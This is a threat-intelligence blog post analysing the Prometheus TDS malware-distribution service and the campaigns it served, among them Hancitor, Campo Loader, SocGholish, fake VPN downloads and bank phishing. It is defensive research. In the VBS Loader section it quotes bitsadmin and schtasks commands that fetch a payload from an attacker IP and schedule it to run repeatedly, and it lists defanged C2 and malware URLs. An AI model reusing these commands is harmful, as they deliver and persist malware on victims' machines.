                            <h1 class="header__title title-h2 mb-24 mt-md-48 mt-lg-64 mt-xl-64">Prometheus TDS</h1><p class="header__text mb-xs-48 mb-64 mb-lg-96 mb-xl-96">The key to success for Campo Loader, Hancitor, IcedID, and QBot</p><div class="post-info__date mb-24 mb-lg-32 mb-xl-48"><div class="body2">August 5, 2021 · <span id="reading-time"></span> min to read · Threat Intelligence</div></div><div class="post-info__image mb-24 mb-lg-32 mb-xl-48"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/prometheus-tds-1.png.webp" type="image/webp"><img src="https://www.group-ib.com/wp-content/uploads/prometheus-tds-1.png" alt="" class="webpexpress-processed"></picture></div><div class="post-info__tags"><div class="post-info__tag body2">Hancitor</div><div class="post-info__tag body2">Prometheus TDS</div><div class="post-info__tag body2">Threat Intelligence</div></div>                        </div>
                    </div>
                </div>
                <div class="blog-post-content" id="blog-post-content">
                    <div class="blog-post-content__section--text"><h2>Introduction</h2>
<p>In the spring of 2021, Group-IB&#8217;s <a href="/products/threat-intelligence/" target="_blank" rel="noopener">Threat Intelligence</a> analysts discovered traces of a malware campaign distributing Hancitor. The researchers took an interest in an untypical pattern of the downloader&#8217;s distribution, which was subsequently described by <a href="https://unit42.paloaltonetworks.com/hancitor-infections-cobalt-strike/" target="_blank" rel="nofollow noopener">Unit 42</a> and <a href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/hancitor-making-use-of-cookies-to-prevent-url-scraping/?web_view=true" target="_blank" rel="nofollow noopener">McAfee</a> researchers as a new technique designed to hide documents containing malicious links from web scanners&#8217; radars. However, the data extracted by Group-IB&#8217;s analysts indicates that a similar pattern is also used to distribute malware such as Campo Loader, IcedID, QBot, SocGholish, and Buer Loader.</p>
<p><strong>Group-IB discovered at least 3,000 targets of separate malware campaigns that make use of the same scheme.</strong> By analyzing the list of targets, the experts were able to establish the two most active campaigns. The first targeted individuals in Belgium, and the second targeted companies, corporations, universities, and government organizations in the United States.</p>
<p>By analyzing the malware distribution campaigns, Group-IB&#8217;s experts were able to conclude that it was possible for them to be carried out using the same MaaS solution. This assumption was later confirmed by Group-IB&#8217;s analysts after they found a sale notice for a service designed to distribute malicious files and redirect users to phishing and malicious sites — Prometheus TDS (Traffic Direction System) — on one of the underground platforms.</p>
<h2>Description</h2>
<p><strong>Prometheus TDS is an underground service that distributes malicious files and redirects visitors to phishing and malicious sites.</strong> This service is made up of the Prometheus TDS administrative panel, in which an attacker configures the necessary parameters for a malicious campaign: downloading malicious files, and configuring restrictions on users&#8217; geolocation, browser version, and operating system.</p>
<p>To prevent victims of malicious campaigns from interacting with the administrative panel directly, which may result in the attacker&#8217;s server being disclosed and blocked, <strong>Prometheus TDS uses third-party infected websites that act as a middleman between the attacker&#8217;s administrative panel and the user</strong>. It should also be mentioned that the list of compromised websites is manually added by the malware campaign&#8217;s operators. The list is uploaded through importing links to <a href="https://www.group-ib.com/resources/knowledge-hub/web-shell/" target="_blank" rel="noopener">web shells</a>. A special PHP file named Prometheus.Backdoor is uploaded to the compromised websites to collect and send back data about the user interacting with the administrative panel. After analyzing the data collected, the administrative panel decides whether to send the payload to the user and/or to redirect them to the specified URL.</p>
<p><strong>More than three thousand email addresses targeted in the first phase of malicious campaigns</strong> in which Prometheus TDS was used to send malicious emails were extracted by Group-IB Threat Intelligence analysts. The extracted data analysis helped identify the most active campaigns, one targeting individuals in Belgium (more than 2,000 emails) and the other targeting US government agencies, companies, and corporations in various sectors (banking and finance, retail, energy and mining, cybersecurity, healthcare, IT, and insurance), (more than 260 emails). The data about identified targets of attacks with the use of Prometheus TDS and companies affected as their result has been handed over to the US, German and Belgian CERTs.</p>
<div id="attachment_25606" style="width: 1510px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25606" decoding="async" class="size-full wp-image-25606" src="https://www.group-ib.com/wp-content/uploads/1-min-6.webp" alt="Targets of malicious campaigns with the use of Prometheus TDS" width="1500" height="843" /><p id="caption-attachment-25606" class="wp-caption-text">Targets of malicious campaigns with the use of Prometheus TDS</p></div>
<h2>Attack scheme using Prometheus TDS</h2>
<p>The distribution of malware using Prometheus TDS is carried out in several stages.</p>
<h3>Stage 1</h3>
<p>The user receives an email containing one of the following elements:</p>
<ul>
<li>An HTML file that redirects the user to a compromised site on which Prometheus.Backdoor is installed;</li>
<li>A link to a web shell that redirects users to a specified URL, in this case to one of the addresses used by Prometheus TDS;</li>
<li>A link to a Google Doc containing the URL redirecting users to a malicious link.</li>
</ul>
<div id="attachment_25607" style="width: 1510px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25607" decoding="async" class="size-full wp-image-25607" src="https://www.group-ib.com/wp-content/uploads/2-min-4.webp" alt="The implementation of malicious campaigns with the use of Prometheus TDS" width="1500" height="843" /><p id="caption-attachment-25607" class="wp-caption-text">The implementation of malicious campaigns with the use of Prometheus TDS</p></div>
<div id="attachment_25608" style="width: 1690px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25608" decoding="async" class="size-full wp-image-25608" src="https://www.group-ib.com/wp-content/uploads/3-min-3.webp" alt="Google Docs files used by Prometheus TDS" width="1680" height="839" /><p id="caption-attachment-25608" class="wp-caption-text">Google Docs files used by Prometheus TDS</p></div>
<h3>Stage 2</h3>
<p>The user opens the attachment or follows the link and is redirected to the Prometheus.Backdoor URL. Prometheus.Backdoor collects the available data on the user.</p>
<h3>Stage 3</h3>
<p>The data collected is sent to the Prometheus TDS admin panel. This admin panel then decides whether to instruct the backdoor to send a malicious file to the users and/or to redirect them to the specified URL.</p>
<h2>Analysis of Prometheus.Backdoor</h2>
<p>Malicious campaigns using Prometheus TDS are carried out via hacked sites with <strong>Prometheus.Backdoor</strong> installed on them. The backdoor is controlled through the admin panel.</p>
<div id="attachment_25609" style="width: 1376px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25609" decoding="async" class="size-full wp-image-25609" src="https://www.group-ib.com/wp-content/uploads/4-min-2.webp" alt="Prometheus TDS admin panel" width="1366" height="768" /><p id="caption-attachment-25609" class="wp-caption-text">Prometheus TDS admin panel</p></div>
<p>The data exchange between the administrative panel and the backdoor is encrypted with an XOR cipher. The key for this cipher is explicitly hardcoded in the Prometheus.Backdoor settings, along with the address of the administrative panel used by the attackers to manage backdoors on infected sites.</p>
<div id="attachment_25610" style="width: 495px" class="wp-caption alignnone"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/5-min-16.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25610" decoding="async" class="wp-image-25610 size-full webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/5-min-16.png" alt="A fragment of the Prometheus.Backdoor code " width="485" height="545"></picture><p id="caption-attachment-25610" class="wp-caption-text">A fragment of the Prometheus.Backdoor code containing the address of the administrative panel, a key for encrypting transmitted data, and functions for encrypting and decrypting data</p></div>
<p>After the user visits the infected site, Prometheus.Backdoor collects basic information about them: IP address, User-Agent, Referrer header, time zone, and language data, and then forwards this information to the Prometheus admin panel.</p>
<div id="attachment_25611" style="width: 791px" class="wp-caption alignnone"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/6-min-13.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25611" decoding="async" class="size-full wp-image-25611 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/6-min-13.png" alt="Part of the Prometheus.Backdoor code used to collect information about the user" width="781" height="698"></picture><p id="caption-attachment-25611" class="wp-caption-text">Part of the Prometheus.Backdoor code used to collect information about the user&#8217;s time zone</p></div>
<div id="attachment_25612" style="width: 453px" class="wp-caption alignnone"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/7-min-13.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25612" decoding="async" class="size-full wp-image-25612 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/7-min-13.png" alt="Part of the Prometheus.Backdoor code showing the algorithm used to generate a request " width="443" height="381"></picture><p id="caption-attachment-25612" class="wp-caption-text">Part of the Prometheus.Backdoor code showing the algorithm used to generate a request to the administrative panel for the transfer of visitor data</p></div>
<p><strong>If the user is not recognized as a bot, then, depending on the configuration, the administrative panel can send a command to redirect the user to the specified URL, or to send a malicious file.</strong> The payload file is sent using a special JavaScript code. Most often, the malicious software can be found in weaponized Microsoft Word or Excel documents, however, the attackers also use ZIP and RAR files. In some cases, the user will be redirected to a legitimate site immediately after downloading the file, so it will appear to them like the file was downloaded from a safe source.</p>
<div id="attachment_25613" style="width: 683px" class="wp-caption alignnone"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/8-min-13.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25613" decoding="async" class="size-full wp-image-25613 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/8-min-13.png" alt="Part of the Prometheus.Backdoor code showing a method for serving malicious files" width="673" height="776"></picture><p id="caption-attachment-25613" class="wp-caption-text">Part of the Prometheus.Backdoor code showing a method for serving malicious files</p></div>
<h2>Malware campaigns analysis</h2>
<h3>Campo Loader</h3>
<p>Analyzing the extracted files, Group-IB <a href="/products/threat-intelligence/" target="_blank" rel="noopener">Threat Intelligence</a> analysts found<strong> 18 unique malicious documents relating to the Campo Loader, aka the BazaLoader malware</strong>. After downloading the malware, the user is redirected to the DocuSign or USPS sites as a distraction from the malware&#8217;s activity.</p>
<div id="attachment_25614" style="width: 847px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25614" decoding="async" class="size-full wp-image-25614" src="https://www.group-ib.com/wp-content/uploads/9-min-4.webp" alt="A screenshot of a decoy document from the &quot;Campo Loader&quot;" width="837" height="554" /><p id="caption-attachment-25614" class="wp-caption-text">A screenshot of a decoy document from the &#8220;Campo Loader&#8221; distribution campaign</p></div>
<p><strong>Campo Loader spreads through malicious macros in Microsoft Office documents</strong>. After the victim activates the macros, the loader saves and then decodes the .dll file, which is executed through certutil. After the dumped .dll file is executed, it sends an HTTP request to its C&amp;C server:</p>
<div id="attachment_25615" style="width: 731px" class="wp-caption alignnone"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/10-min-12.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25615" decoding="async" class="size-full wp-image-25615 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/10-min-12.png" alt="Content of the malicious macros" width="721" height="92"></picture><p id="caption-attachment-25615" class="wp-caption-text">Content of the malicious macros</p></div>
<p>The server processes the incoming request and, depending on the victim&#8217;s geolocation (based on their IP address) decides whether to send the payload or redirect them to Yahoo!, GNU, or other resources. The downloader takes its name from the path of the same name in HTTP requests used to download malicious files during the second stage.</p>
<div id="attachment_25616" style="width: 1083px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25616" decoding="async" class="size-full wp-image-25616" src="https://www.group-ib.com/wp-content/uploads/11-min-1.webp" alt="Redirection to gnu.org" width="1073" height="249" /><p id="caption-attachment-25616" class="wp-caption-text">Redirection to gnu.org</p></div>
<p>If the administrative panel gives the command to send the payload, then the user is redirected to the resource where it is stored or receives it directly from the C&amp;C server.</p>
<div id="attachment_25617" style="width: 1008px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25617" decoding="async" class="size-full wp-image-25617" src="https://www.group-ib.com/wp-content/uploads/12-min.webp" alt="Results of the request satisfying the server's requirements" width="998" height="536" /><p id="caption-attachment-25617" class="wp-caption-text">Results of the request satisfying the server&#8217;s requirements to upload a second stage file</p></div>
<p>Analysis revealed that Campo Loader was used at various times to distribute TrickBot and Ursnif/Gozi bankers, etc.</p>
<div id="attachment_25618" style="width: 1376px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25618" decoding="async" class="size-full wp-image-25618" src="https://www.group-ib.com/wp-content/uploads/13-min-1.webp" alt="Campo Loader administrative panel" width="1366" height="768" /><p id="caption-attachment-25618" class="wp-caption-text">Campo Loader administrative panel</p></div>
<h3>Hancitor</h3>
<p>Monitoring of Prometheus TDS revealed 34 malicious documents relating to the Hancitor malware, which is a downloader trojan.</p>
<div id="attachment_25619" style="width: 1286px" class="wp-caption alignnone"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/14-min-9.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25619" decoding="async" class="size-full wp-image-25619 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/14-min-9.png" alt="A screenshot of a decoy document from the Hancitor" width="1276" height="798"></picture><p id="caption-attachment-25619" class="wp-caption-text">A screenshot of a decoy document from the Hancitor distribution campaign</p></div>
<p>After downloading the malicious document, the victim is either redirected to the DocuSign website, or to phishing sites using IDN domains that imitate the sites of two US banks.</p>
<div id="attachment_25620" style="width: 644px" class="wp-caption alignnone"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/15-min.jpg.webp" type="image/webp"><img aria-describedby="caption-attachment-25620" decoding="async" class="size-full wp-image-25620 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/15-min.jpg" alt="A phishing page to which a user was redirected after downloading a malicious Hancitor load " width="634" height="626"></picture><p id="caption-attachment-25620" class="wp-caption-text">A phishing page to which a user was redirected after downloading a malicious Hancitor load located on an IDN domain xn--keynvigatorkey-yp8g[.]com (https://urlscan.io/result/108463b8-7c0d-4644-9d2b-52cbca3426f8/)</p></div>
<p>One of the files identified (<em>SHA1: 41138f0331c3edb731c9871709cffd01e4ba2d88</em>) was sent in a phishing email containing a link to a Google Doc. The server then processes the data collected about the user&#8217;s system and decides whether to send the payload or not.</p>
<div id="attachment_25621" style="width: 1289px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25621" decoding="async" class="size-full wp-image-25621" src="https://www.group-ib.com/wp-content/uploads/16-min.webp" alt="An example of requests to a site containing Prometheus.Backdoor" width="1279" height="722" /><p id="caption-attachment-25621" class="wp-caption-text">An example of requests to a site containing Prometheus.Backdoor, with successful delivery of a malicious document and subsequent redirection to DocuSign</p></div>

After downloading the file, the victim is redirected to Docusign.com.</p>
<div id="attachment_25622" style="width: 507px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-25622" decoding="async" class="size-full wp-image-25622" src="https://www.group-ib.com/wp-content/uploads/17-min.webp" alt="Part of the Prometheus.Backdoor code " width="497" height="517" /><p id="caption-attachment-25622" class="wp-caption-text">Part of the Prometheus.Backdoor code showing a malicious file distribution pattern</p></div>

After the file has been executed, the following HTTP requests are sent:</p>
<ul>
<li>hxxp://api.ipify[.]org/</li>
<li>hxxp://ementincied[.]com/8/forum.php</li>

<div id="attachment_25623" style="width: 1369px" class="wp-caption alignnone"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/18-min-5.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25623" decoding="async" class="size-full wp-image-25623 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/18-min-5.png" alt="The downloaded file "6fwedzs3w3fg.exe" " width="1359" height="477"></picture><p id="caption-attachment-25623" class="wp-caption-text">The downloaded file &#8220;6fwedzs3w3fg.exe&#8221; (SHA1: 7394632d8cfc00c35570d219e49de63076294b6b ) is a sample of Ficker Stealer</p></div>
<p>In April 2021, Unit 42 researchers partially analyzed this campaign. The experts also mention the Ficker Stealer, Cobalt Strike, and Send-Safe spambots in their <a href="https://unit42.paloaltonetworks.com/hancitor-infections-cobalt-strike/" target="_blank" rel="nofollow noopener">research</a>.</p>

<h3>VBS Loader</h3>
<p>During the analysis, the specialists found three samples of <strong>an unidentified VBS loader</strong>. After downloading these files, the user is redirected to the USPS website. When the user clicks on a malicious link, Prometheus TDS asks the user to download a ZIP archive containing a VBS script. After the script is launched, the payload is downloaded in the form of another VBS script using bitsadmin. The downloaded file is launched using the Windows Task Scheduler by creating a command that runs the VBS script every 30 minutes starting at 00:00.</p>
<div id="attachment_25629" style="width: 906px" class="wp-caption alignnone"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/24-min-3.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25629" decoding="async" class="size-full wp-image-25629 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/24-min-3.png" alt="Part of the obfuscated VBS loader " width="896" height="438"></picture><p id="caption-attachment-25629" class="wp-caption-text">Part of the obfuscated VBS loader containing the URL for the payload download</p></div>
<p>To download and run the payload, the VBS script executes a set of special commands using bitsadmin and schtasks:</p>
<ul>
<li>cmd /k exit | exit &amp; bitsadmin /create EncodingFirm &amp; exit</li>
<li>cmd /k exit | exit &amp; bitsadmin /addfile EncodingFirm hXXp://155[.]94[.]193[.]10/user/get/ButPrinciple1619186669 C:\Users\&lt;User&gt;\AppData\Local\Temp\DefineKeeps.tmp &amp; exit</li>
<li>cmd /k exit | exit &amp; bitsadmin /resume EncodingFirm &amp; exit</li>
<li>cmd /k exit | exit &amp; schtasks /create /sc minute /mo 30 /tn &#8220;Task Update ButPrinciple&#8221; /f /st 00:00 /tr C:\Users\&lt;User&gt;\AppData\Local\ButPrinciple\ButPrinciple.vbs &amp; exit</li>
<li>cmd /k exit | exit &amp; bitsadmin /complete EncodingFirm &amp; exit</li>
<li>cmd /k exit | exit &amp; bitsadmin /reset &amp; exit</li>
</ul>
<p>At the time of analysis, there was only one similar VBS loader sample on <a href="https://www.virustotal.com/gui/file/a2bd96db3eb0f4e5ab3dd013b0a0ba69c7c84986925623dc31e3b911d963e1b9/details" target="_blank" rel="nofollow noopener">VirusTotal</a>, which was detectable by only one antivirus solution.</p>
<div id="attachment_25630" style="width: 1281px" class="wp-caption alignnone"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/25-min-1.jpg.webp" type="image/webp"><img aria-describedby="caption-attachment-25630" decoding="async" class="size-full wp-image-25630 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/25-min-1.jpg" alt="Antivirus detection for file" width="1271" height="629"></picture><p id="caption-attachment-25630" class="wp-caption-text">Antivirus detection for file fcd8674f8df4390d90dad6c31a3dd6f33d6a74de</p></div>
<h3>Buer Loader</h3>
<p>Within the campaign, the file &#8220;<em>document010498(1).zip</em>&#8221; was also distributed. It contained the file &#8220;<em>document010498.jnlp</em>&#8220;, which downloads the payload from the domain &#8220;<em>secure-doc-viewer[.]com</em>&#8220;.</p>
<p>Unfortunately, at the time of analysis, the domain was not active. Based on the contents of the file, it seems reasonable to assume that it is a decoy document used to download files relating to the second stage.</p>

<h3>SocGholish</h3>
<p>The analysis of the URLs of the compromised sites used in the Prometheus TDS infrastructure revealed that some of them redirect the user to the home page of the compromised website.</p>
<div id="attachment_25634" style="width: 1288px" class="wp-caption alignnone"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/29-min-2.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25634" decoding="async" class="size-full wp-image-25634 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/29-min-2.png" alt="Prometheus.Backdoor URL " width="1278" height="693"></picture><p id="caption-attachment-25634" class="wp-caption-text">Prometheus.Backdoor URL that redirects the visitor to the home page of the compromised site</p></div>
<p>Through research, it was discovered that these sites are used to distribute <strong>the SocGholish malware</strong> under the guise of Google Chrome browser updates.</p>
<div id="attachment_25635" style="width: 1089px" class="wp-caption alignnone"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/30-min-2.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25635" decoding="async" class="size-full wp-image-25635 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/30-min-2.png" alt="Loading a landing page with fake Google Chrome browser updates" width="1079" height="357"></picture><p id="caption-attachment-25635" class="wp-caption-text">Loading a landing page with fake Google Chrome browser updates</p></div>
<p>At the same time, SocGholish uses a malicious file distribution pattern very similar to the script used by Prometheus TDS. When the user visits an infected site, they see a page with JavaScript code that contains a Base64 encoded ZIP archive with a malicious file that will be downloaded if the user clicks on the &#8220;<em>Update browser</em>&#8221; button.</p>
<div id="attachment_25636" style="width: 625px" class="wp-caption alignnone"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/31-min-2.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25636" decoding="async" class="size-full wp-image-25636 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/31-min-2.png" alt="Part of the SocGholish landing page" width="615" height="421"></picture><p id="caption-attachment-25636" class="wp-caption-text">Part of the SocGholish landing page</p></div>
<p>To the user, this page appears to be offering browser updates.</p>

<h3>Fake VPN</h3>
<p>In addition to distributing malicious files, Prometheus TDS is also used as a classic TDS to redirect users to specific sites. One of these sites is the fake site of a well-known VPN provider located at <em>hXXps://huvpn[.]com/free-vpn/</em>. Clicking the download button initiates the download of a malicious EXE file from <em>hXXps://windscribe.s3.us-east-2.amazonaws[.]com/Windscribe.exe</em> (<em>SHA1: f729b75d68824f200bebe3c3613c478f9d276501</em>).</p>
<div id="attachment_25638" style="width: 810px" class="wp-caption alignnone"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/33-min-2.png.webp" type="image/webp"><img aria-describedby="caption-attachment-25638" decoding="async" class="size-full wp-image-25638 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/33-min-2.png" alt="A screenshot of a fake Windscribe download page" width="800" height="600"></picture><p id="caption-attachment-25638" class="wp-caption-text">A screenshot of a fake Windscribe download page</p></div>
<h3>Viagra SPAM</h3>
<p><strong>Prometheus TDS also redirected users to sites selling pharmaceutical products.</strong> Operators of such sites often have affiliate and partnership programs. Partners, in turn, often resort to aggressive <strong>SPAM campaigns</strong> in order to increase the earnings within the affiliate program. Analysis of the Prometheus infrastructure by Group-IB specialists revealed links that redirect users to sites relating to a Canadian pharmacy.</p>
<div id="attachment_25639" style="width: 952px" class="wp-caption alignnone"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/34-min.jpg.webp" type="image/webp"><img aria-describedby="caption-attachment-25639" decoding="async" class="size-full wp-image-25639 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/34-min.jpg" alt="The use of Prometheus TDS for spam emails" width="942" height="852"></picture><p id="caption-attachment-25639" class="wp-caption-text">The use of Prometheus TDS for spam emails to redirect users to particular websites</p></div>
<h3>Banking phishing</h3>
<p><strong>Prometheus TDS was also used to redirect users to banking phishing sites.</strong> For example, during a campaign active from March to May 2021, users who followed the link to Prometheus.Backdoor were redirected to fake sites that mimicked the site of a German bank.</p>
<div id="attachment_25640" style="width: 1290px" class="wp-caption alignnone"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/35-min.jpg.webp" type="image/webp"><img aria-describedby="caption-attachment-25640" decoding="async" class="size-full wp-image-25640 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/35-min.jpg" alt="Example of a phishing page" width="1280" height="960"></picture><p id="caption-attachment-25640" class="wp-caption-text">Example of a phishing page used in the campaign involving Prometheus TDS https://urlscan.io/result/69c84104-f272-4c88-970f-a3131c0580ad/</p></div>
<h2>Offers to buy Prometheus TDS on underground forums</h2>

        str = str.replace(/<[^>]*>/g, '');
        str = str.replace(/[^a-zA-Z0-9\s\u0400-\u04FF]/g, '');
        str = str.replace(/\s+/g, '-').toLowerCase();
        str = str.replace(/^-+|-+$/g, '');
        postnavitem.classList += ' ' + str;
        postnavitem.href = '#' + str;
        h2elementtag.id = str;
        document.getElementById('post-navigation__wrapper').appendChild(postnavitem);
    }

    const sections = document.querySelectorAll('h2');
    const navItems = document.querySelectorAll('.post-navigation__item');

    window.addEventListener('scroll', () => {
        let current = '';
        sections.forEach((section) => {
            const sectionTop = section.offsetTop;
            const sectionHeight = section.clientHeight;
            if (pageYOffset >= sectionTop - sectionHeight / 10) {
                current = section.getAttribute('id');
            }
        });

        navItems.forEach((a) => {
            a.classList.remove('active');
            if (a.classList.contains(current)) {
                a.classList.add('active');
            }
        });
    });

    function positioningSidebar() {
        let sidebar = document.getElementById('sidebar');
        let sidebarHeight = sidebar.offsetHeight;
        let windowHeight = document.documentElement.clientHeight;
        if (windowHeight < (sidebarHeight + 48)) {
            let sidebarAuthors = sidebar.querySelector('.sidebar__authors');
            let sidebarMorePosts = sidebar.querySelector('.sidebar__more-posts');
            let authorsHeight = sidebarAuthors ? sidebarAuthors.offsetHeight : 0;
            let morePostsHeight = sidebarMorePosts ? sidebarMorePosts.offsetHeight : 0;
            let sidebarTop = authorsHeight + morePostsHeight + 140;
            jQuery(sidebar).css('top', -sidebarTop + 'px');
        } else {
            jQuery(sidebar).css('top', '72px');
        }
    }
